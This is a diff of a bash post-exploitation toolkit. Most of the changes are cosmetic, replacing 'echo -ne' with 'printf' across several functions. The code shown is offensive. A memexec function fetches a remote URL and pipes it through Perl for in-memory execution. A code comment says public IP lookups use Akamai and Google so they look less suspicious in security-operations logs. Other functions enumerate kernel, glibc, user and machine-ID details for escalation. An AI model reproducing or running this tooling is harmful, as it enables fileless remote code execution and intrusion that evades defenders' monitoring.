@@ -493,13 +493,13 @@ getuservices() {
 }
 
 getspec() {
-echo -ne "RAM available: "
+printf "RAM available: "
 free -hm | tr '\n' ' ' | awk '{ print $8 }'
-echo -ne "CPU model:"
+printf "CPU model:"
 grep --color=never name /proc/cpuinfo | head -n 1 | awk -F ":" '{print $2}'
-echo -ne "Number of cores: "
+printf "Number of cores: "
 grep --color=never -c processor /proc/cpuinfo
-echo -ne "Disk usage:"
+printf "Disk usage:"
 df -h
 }
 
@@ -569,7 +569,7 @@ qsu() {
 memexec() {
 memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
 finalmem=$(echo "$memfda" | base64 -d)
-finalmem=${finalmem}$(echo -ne "$memfile/ or die;\n")
+finalmem=${finalmem}$(printf "$memfile/ or die;\n")
 finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
 echo "$finalmem" | perl
 }
@@ -664,16 +664,16 @@ ssh-keyscan "$1"
 getip() {
 #we use akamai and google here because they're gonna look less dodgy in SOC's lolgs
 echo "Attempting to get IP..."
-echo -ne "HTTP says: "
+printf "HTTP says: "
 	orc_loadURL 'https://whatismyip.akamai.com'
 echo ""
-echo -ne "DNS says: "
+printf "DNS says: "
 	if hash dig>/dev/null; then
 	dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
-	echo -ne "(used dig)\n"
+	echo "(used dig)"
 	else
 	host -t txt o-o.myaddr.l.google.com ns1.google.com | grep descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
-	echo -ne "(used host)\n"
+	echo "(used host)"
 	fi
 }
 
@@ -830,13 +830,13 @@ getexploit () {
 
 getenum() {
 echo "Doing some basic listing of the usual suspects..."
-echo -ne "Kernel: "
+printf "Kernel: "
 uname -rv
-echo -ne "glibc: "
+printf "glibc: "
 $(ldd $(command -v id) | grep --color=never libc.so | awk -F " " '{print $3}') | grep --color=never -i version | grep -v crypt
-echo -ne "dbus: "
+printf "dbus: "
 dbus-daemon --version | grep --color=never Daemon
-echo -ne "Init system is: "
+printf "Init system is: "
 ps -p 1 | grep --color=never -v CMD| awk -F " " '{ print $4 }'
 }
 
@@ -934,12 +934,12 @@ echo "IP address on the network: "
 	else
 	ip addr show | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
 	fi
-echo -ne "We are uid " 
-id -uz;echo -ne " - "; echo -ne "(";whoami | tr -d '\n';echo ")"
-echo -ne "Machine has been "
+printf "We are uid " 
+id -uz;printf " - "; printf "(";whoami | tr -d '\n';echo ")"
+printf "Machine has been "
 uptime -p
 	if [ -f /etc/machine-id ]; then
-	echo -ne "Unique Machine ID: "
+	printf "Unique Machine ID: "
 	cat /etc/machine-id
 	fi
 echo "============================"
